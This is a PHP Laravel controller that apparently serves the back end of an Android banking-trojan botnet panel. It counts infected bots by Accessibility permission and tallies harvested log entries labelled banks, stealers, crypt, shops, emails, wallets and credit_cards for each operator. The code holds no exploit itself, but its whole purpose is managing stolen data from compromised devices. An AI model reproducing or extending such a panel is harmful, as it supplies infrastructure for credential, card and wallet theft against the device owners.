<?php

namespace App\Http\Controllers;

use App\Helpers\ApiResponse;
use App\Models\Bot;
use App\Models\BotLog;
use App\Models\User;
use Illuminate\Support\Facades\Cache;

class CountController extends Controller
{
    public function list(): ApiResponse
    {
        /** @var User $user */
        $user = auth()->user();

        // $counts = Cache::get("counts.list.$user->id", function () use($user): array {
            $bots = Bot::where('created_at', '>', $user->entitiesTimestamps->bots ?? $user->created_at->toDateTimeString())
                ->whereRaw('JSON_EXTRACT(permissions, "$.accessibility") = "true"')
                ->when(count($user->tags), function($query) use($user) {
                    return $query->whereIn('tag', $user->tagsNames);
                })
                ->count();

            $permissionlessBots = Bot::where('created_at', '>', $user->entitiesTimestamps->permissionless_bots ?? $user->created_at->toDateTimeString())
                ->whereRaw('JSON_EXTRACT(permissions, "$.accessibility") = "false"')
                ->when(count($user->tags), function($query) use($user) {
                    return $query->whereIn('tag', $user->tagsNames);
                })->count();

            $bots_logs = BotLog::join('bots', 'bot_logs.bot_id', '=', 'bots.id')
                ->when(count($user->tags), function($query) use($user) {
                    return $query->whereIn('bots.tag', $user->tagsNames);
                });

            $banks = (clone $bots_logs)
                ->where('type', 'banks')
                ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->banks ?? $user->created_at->toDateTimeString())
                ->count();

            $stealers = (clone $bots_logs)
                ->where('type', 'stealers')
                ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->stealers ?? $user->created_at->toDateTimeString())
                ->count();

            $crypt = (clone $bots_logs)
                ->where('type', 'crypt')
                ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->crypt ?? $user->created_at->toDateTimeString())
                ->count();

            $shops = (clone $bots_logs)
                ->where('type', 'shops')
                ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->shops ?? $user->created_at->toDateTimeString())
                ->count();

            $emails = (clone $bots_logs)
                ->where('type', 'emails')
                ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->emails ?? $user->created_at->toDateTimeString())
                ->count();

            $wallets = (clone $bots_logs)
                ->where('type', 'wallets')
                ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->wallets ?? $user->created_at->toDateTimeString())
                ->count();

            $creditCards  = (clone $bots_logs)
                ->where('type', 'credit_cards')
                ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->credit_cards ?? $user->created_at->toDateTimeString())
                ->count();

            $events = (clone $bots_logs)
                ->where('type', 'events')
                ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->events ?? $user->created_at->toDateTimeString())
                ->count();

            $counts = [
                'bots' => $bots + $permissionlessBots,
                'permissionless_bots' => $permissionlessBots,
                'banks' => $banks,
                'stealers' => $stealers,
                'crypt' => $crypt,
                'shops' => $shops,
                'emails' => $emails,
                'wallets' => $wallets,
                'credit_cards' => $creditCards,
                'events' => min($events, 20),
            ];

            //Cache::put("counts.list.$user->id", $counts, 15);

           // return $counts;
       // });

        return ApiResponse::success($counts);
    }
}
